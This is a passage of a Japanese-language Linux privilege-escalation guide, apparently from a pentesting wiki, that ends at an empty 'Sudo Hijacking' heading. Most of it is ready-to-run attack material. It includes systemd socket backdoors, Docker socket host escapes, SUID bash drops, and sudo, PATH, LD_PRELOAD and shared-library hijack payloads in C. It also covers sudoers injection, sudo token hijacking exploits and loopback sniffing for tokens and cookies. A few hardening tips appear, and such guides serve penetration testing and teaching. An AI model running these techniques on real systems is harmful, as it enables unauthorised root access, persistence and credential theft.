もし **書き込み可能な** `.socket` ファイルを見つけた場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を **追加** することで、ソケットが作成される前にバックドアが実行されます。したがって、**おそらくマシンの再起動を待つ必要がある**でしょう。\
_システムがそのソケットファイル設定を使用していないとバックドアは実行されない点に注意してください_

### Socket activation + writable unit path (create missing service)

別の影響の大きい設定ミスは次のとおりです:

- Accept=no と `Service=<name>.service` を持つ socket unit
- 参照される service unit が存在しない
- 攻撃者が `/etc/systemd/system` （または別の unit 検索パス）に書き込みできる

この場合、攻撃者は `<name>.service` を作成し、ソケットにトラフィックを発生させて systemd に新しいサービスをロードさせ、root として実行させることができます。

簡単なフロー:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

もし**writable socket**を特定できれば（_ここで話しているのは Unix Sockets で、設定の `.socket` ファイルではありません_）、その socket と**通信**でき、脆弱性を悪用できる可能性があります。

### Unix Sockets を列挙する
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

一部には **sockets listening for HTTP** requests を待ち受けているものがある点に注意してください（_私は .socket files のことではなく、unix sockets として機能しているファイルのことを指しています_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
If the socket **responds with an HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.

### 書き込み可能な Docker socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムへroot権限でアクセスするコンテナを実行することを可能にします。

#### **Docker APIを直接使用する**

Docker CLIが利用できない場合でも、Docker socketはDocker APIと`curl`コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送ります。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`を使ってコンテナへの接続を確立し、コンテナ内でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat`接続を設定した後、ホストのファイルシステムへrootレベルでアクセスできるコンテナ内で直接コマンドを実行できます。

### Others

docker グループ `docker` のメンバーであるために docker socket に書き込み権限がある場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)があります。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) のように docker API がポートで待ち受けている場合も、これを悪用できる可能性があります。

コンテナから脱出したり、container runtimes を悪用して権限を昇格させるための**他の方法**については、次を確認してください：


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

もし **`ctr`** コマンドを利用できる場合、以下のページを読んでください。**権限昇格に悪用できる可能性があります**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

もし **`runc`** コマンドを利用できる場合、以下のページを読んでください。**権限昇格に悪用できる可能性があります**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、アプリケーション間で効率的にやり取りやデータ共有を行うための高度な inter-Process Communication (IPC) システムです。モダンな Linux システムを念頭に設計されており、さまざまな形態のアプリケーション間通信に対して堅牢なフレームワークを提供します。

このシステムは汎用性が高く、プロセス間のデータ交換を強化する基本的な IPC をサポートし、拡張された UNIX domain sockets に類似した機能を提供します。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth デーモンからの着信通話に関するシグナルが音楽プレーヤーにミュートを促すといったユーザー体験の向上が可能です。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、サービス要求やメソッド呼び出しを簡素化し、従来は複雑だったプロセスを効率化します。

D-Bus は **allow/deny model** に基づいて動作し、ポリシールールの集合的効果に基づいてメッセージの許可（メソッド呼び出し、シグナル送信など）を管理します。これらのポリシーは bus とのやり取りを指定し、権限の悪用を通じて権限昇格を引き起こす可能性があります。

/etc/dbus-1/system.d/wpa_supplicant.conf にあるようなポリシーの例が示されており、root ユーザーが fi.w1.wpa_supplicant1 を所有し、送信先および受信先として扱える権限が詳細に記載されています。

ユーザーやグループが指定されていないポリシーは普遍的に適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus の通信を enumerate と exploit する方法はこちら:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate してマシンの位置を把握するのは常に興味深い。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering の迅速トリアージ

ホストがコマンドを実行できるが callbacks が失敗する場合、DNS、transport、proxy、route のフィルタリングを迅速に切り分ける:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

アクセスする前に操作できなかった、そのマシン上で動作しているネットワークサービスを必ず確認してください：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
リスナーをバインド先で分類する:

- `0.0.0.0` / `[::]`: 全てのローカルインターフェースで公開される。
- `127.0.0.1` / `::1`: ローカル限定 (good tunnel/forward candidates).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): 通常、内部セグメントからのみ到達可能。

### ローカル限定サービスのトリアージワークフロー

ホストを侵害した際、`127.0.0.1` にバインドされたサービスはシェルから初めて到達可能になることが多い。手早いローカルでのワークフローは次の通り:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS をネットワークスキャナとして（ネットワーク専用モード）

ローカルの PE チェックに加え、linPEAS はネットワークに特化したスキャナとして動作できます。  
利用可能なバイナリを `$PATH` から使用します（通常 `fping`, `ping`, `nc`, `ncat`）。ツールをインストールすることはありません。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-d`、`-p`、`-i` を `-t` なしで渡すと、linPEAS は純粋な network scanner として動作し（残りの privilege-escalation チェックをスキップします）。

### Sniffing

sniff traffic ができるか確認してください。できるなら、いくつかの credentials を取得できる可能性があります。
```
timeout 1 tcpdump
```
簡単な実践的チェック:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
ループバック (`lo`) は、post-exploitation において特に有用です。多くの内部専用サービスがそこで tokens/cookies/credentials を公開しているため：
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
今キャプチャして、後で解析する:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## ユーザー

### 一般的な列挙

自分が**誰**で、どの**権限**を持っているか、どの**ユーザー**がシステムにいるか、どの**ユーザー**が**ログイン**できるか、どの**ユーザー**が**root 権限**を持っているかを確認してください：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部のLinuxバージョンは、**UID > INT_MAX** を持つユーザーが権限を昇格できるバグの影響を受けていました。詳細情報: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

root 権限を付与する可能性のある**いずれかのグループのメンバー**であるか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

可能であれば、クリップボード内に何か興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**任意のパスワードを知っている**場合は、そのパスワードで**各ユーザーにログインを試みてください**。

### Su Brute

多数のノイズを出すことを気にしない場合、対象のマシンに`su`と`timeout`バイナリが存在すれば、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は`-a`パラメータでユーザーのブルートフォースも試みます。

## 書き込み可能な PATH の悪用

### $PATH

もし**$PATHのいずれかのフォルダに書き込みできる**ことが分かったら、**書き込み可能なフォルダ内にbackdoorを作成する**ことで別のユーザー（理想的にはroot）が実行するコマンドと同名のファイルを置き、権限昇格できる可能性があります。ただし、そのコマンドが**あなたの書き込み可能フォルダより前に位置するフォルダから読み込まれない**ことが条件です。

### SUDO and SUID

sudo を使ってあるコマンドを実行できる可能性があるか、またはファイルに suid ビットが付いている可能性があります。確認するには次を使ってください:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の**予期しないコマンドはファイルの読み取りおよび/または書き込み、さらにはコマンドの実行を可能にします。**例えば:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定によって、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できるようになる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー`demo`は`root`として`vim`を実行できるため、rootディレクトリにsshキーを追加するか、`sh`を呼び出すことでシェルを簡単に取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、ユーザーが何かを実行する際に**set an environment variable**を行えるようにします:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTBのAdmirerマシンに基づく**もので、スクリプトを root として実行する際に任意の python ライブラリを読み込むための **PYTHONPATH hijacking** に**脆弱でした**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep によって保持される → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- 動作原理: 非対話的シェルでは、Bash は `$BASH_ENV` を評価し、対象スクリプトを実行する前にそのファイルを source（読み込み）します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。`BASH_ENV` が sudo によって保持されている場合、あなたのファイルは root privileges で source されます。

- 要件:
- 実行可能な sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `env_keep` に `BASH_ENV` が含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `BASH_ENV`（および`ENV`）を`env_keep`から削除し、`env_reset`を優先する。
- sudo が許可するコマンドに対してシェルラッパーを避け、最小限のバイナリを使用する。
- sudo の I/O ロギングと、保存された env vars が使用された場合のアラートを検討する。

### Terraform via sudo with preserved HOME (!env_reset)

もし sudo が環境をそのままにしておき（`!env_reset`）、かつ `terraform apply` を許可する場合、`$HOME` は呼び出し元ユーザーのままになります。Terraform はそのため root として **$HOME/.terraformrc** を読み込み、`provider_installation.dev_overrides` を尊重します。

- 必要な provider を書き込み可能なディレクトリに向け、その provider の名前を持つ悪意あるプラグイン（例: `terraform-provider-examples`）を配置する：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform は Go plugin handshake に失敗しますが、終了する前にペイロードを root として実行し、SUID shell を残します。

### TF_VAR overrides + symlink validation bypass

Terraform の変数は `TF_VAR_<name>` 環境変数で提供できます。sudo が環境を保持する場合、それらは残ります。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような弱い検証は symlinks を使って回避できます:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraformはシンボリックリンクを解決して、実際の`/root/root.txt`を攻撃者が読める場所にコピーします。同じ手法は、宛先のシンボリックリンクを事前に作成することで、プロバイダの宛先パスを`/etc/cron.d/`の中に向けるなど、特権パスへの**書き込み**にも利用できます。

### requiretty / !requiretty

On some older distributions, sudo can be configured with `requiretty`, which forces sudo to run only from an interactive TTY. If `!requiretty` is set (or the option is absent), sudo can be executed from non-interactive contexts such as reverse shells, cron jobs, or scripts.
```bash
Defaults !requiretty
```
これはそれ自体では直接的な脆弱性ではありませんが、sudo ルールが完全な PTY を必要とせずに悪用され得る状況を拡大します。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- 要件: 絶対パスを使わずにコマンド（`free`, `df`, `ps`, など）を呼び出すスクリプト/バイナリを実行する sudo ルール（多くは `NOPASSWD`）と、最初に検索される書き込み可能な PATH エントリ。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 実行時のパスをバイパス
**Jump** して他のファイルを読むか、**symlinks** を使用します。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使われている(\*)なら、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary (コマンドパスが指定されていない場合)

もし**sudo permission**が単一のコマンドに**パスを指定せずに**与えられている場合: _hacker10 ALL= (root) less_、PATH変数を変更して悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合にも使用できます（必ず _**strings**_ で奇妙な SUID バイナリの内容を確認してください）**。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary（コマンドのパスが指定されている場合）

もし**suid** バイナリが**パスを指定して別のコマンドを実行している**場合は、suid ファイルが呼び出しているコマンド名と同じ名前の関数を作成して**export a function** を試すことができます。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、同名の関数を作成して export してみてください:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid バイナリを呼び出すと、この関数が実行されます

### SUID wrapper によって実行される書き込み可能な script

一般的な custom-app の misconfiguration は、root-owned な SUID binary wrapper が script を実行する一方で、その script 自体が low-priv users によって書き込み可能になっていることです。

典型的なパターン:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
もし `/usr/local/bin/backup.sh` が書き込み可能であれば、payload コマンドを追記してから SUID wrapper を実行できます：
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
簡単なチェック:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準 C ライブラリ（`libc.so`）を含む他のすべてのライブラリより前にローダが読み込む 1 つ以上の共有ライブラリ（.so ファイル）を指定するために使用されます。この処理はライブラリのプリロードとして知られています。

しかし、この機能が悪用されるのを防ぎ、特に **suid/sgid** 実行ファイルに対するシステムのセキュリティを維持するために、システムはいくつかの条件を強制します:

- ローダは、実ユーザー ID（_ruid_）と有効ユーザー ID（_euid_）が一致しない実行ファイルに対して **LD_PRELOAD** を無視します。
- suid/sgid の実行ファイルの場合、プリロードされるのは同様に suid/sgid である標準パス内のライブラリのみです。

`sudo` でコマンドを実行する権限があり、`sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合、権限昇格が発生する可能性があります。この設定により、`sudo` 実行時でも **LD_PRELOAD** 環境変数が保持され認識されるため、特権で任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
次の名前で保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に **それをコンパイル** します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、実行中に**escalate privileges**を行います
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 同様の privesc は、攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合に悪用され得ます。攻撃者はライブラリが検索されるパスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常とは異なる**SUID**権限を持つバイナリを見つけたら、そのバイナリが**.so**ファイルを正しくロードしているか確認するのが良い。これは次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用の可能性を示唆します。

これを悪用するには、_"/path/to/.config/libcalc.c"_ という C ファイルを作成し、次のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルおよび実行されると、ファイル権限を操作して特権を昇格させ、昇格した権限でシェルを実行することを目的としています。

上記の C ファイルを共有オブジェクト（.so）ファイルにコンパイルするには：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最終的に、影響を受けた SUID バイナリを実行すると exploit がトリガーされ、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUIDバイナリが、我々が書き込み可能なフォルダからライブラリをロードしていることがわかったので、そのフォルダに必要な名前でライブラリを作成します:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成したライブラリには `a_function_name` という関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できるUnixバイナリのキュレーションされた一覧です。 [**GTFOArgs**](https://gtfoargs.github.io/) は同様のもので、コマンドに**引数のみを注入できる**場合を対象としています。

このプロジェクトは、restricted shells からの脱出、権限昇格や維持、ファイル転送、bind and reverse shells の生成、その他の post-exploitation タスクを容易にするために悪用できるUnixバイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、任意の sudo ルールを悪用する方法が見つかるか確認できます。

### Reusing Sudo Tokens

パスワードを知らないが **sudo access** がある場合、sudo コマンドの実行を待ち、そのセッショントークンをハイジャックすることで権限を昇格できます。

権限を昇格するための要件:

- すでにユーザー _sampleuser_ としてシェルを持っている
- _sampleuser_ は過去**15分**の間に何かを実行するために **`sudo` を使用している**（デフォルトではそれがパスワードなしで `sudo` を使える sudo トークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
- gdb にアクセスでき、（必要なら）アップロードできること

(一時的に `ptrace_scope` を有効にするには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使うか、`/etc/sysctl.d/10-ptrace.conf` を永続的に変更して `kernel.yama.ptrace_scope = 0` を設定します)

これらの要件がすべて満たされていれば、**次を使用して権限を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 最初の **exploit** (`exploit.sh`) はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使って **あなたのセッションで sudo トークンを有効化** できます（自動的に root シェルが得られるわけではありません。`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に **root 所有で setuid が付いた** sh シェルを作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- この**third exploit** (`exploit_v3.sh`)は**sudoers file を作成し**、**sudo tokens を永続化し、すべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ自体、またはフォルダ内に作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って **ユーザーとPIDのための sudo token を作成する**ことができます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザーとして PID 1234 の shell を持っている場合、パスワードを知らなくても次のように実行して **obtain sudo privileges** できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how.  
これらのファイルは **デフォルトでは user root と group root のみが read できます**.\
**If** このファイルを **read** できれば、**obtain some interesting information** を得られる可能性があります、そして任意のファイルに **write** できれば、**escalate privileges** できます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができれば、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSDでは、`sudo` バイナリの代替として `doas` のようなものが存在します。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

